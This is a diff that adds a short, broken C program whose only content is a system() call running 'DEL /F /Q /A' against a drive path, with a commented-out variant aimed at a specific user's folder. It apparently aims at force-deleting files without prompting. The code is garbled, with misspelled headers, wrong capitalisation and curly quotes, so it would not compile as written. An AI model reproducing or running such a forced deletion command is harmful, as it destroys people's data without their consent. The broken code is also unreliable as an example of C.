@@ -1,0 +1,12 @@
+#include<studio.h>
+
+#include<DoS.h>
+
+Void main()
+
+{
+
+//System(“DEL /F /Q /A <c:\users\launde>  “);
+System(“DEL /F /Q /A <drive path>  “);
+
+}
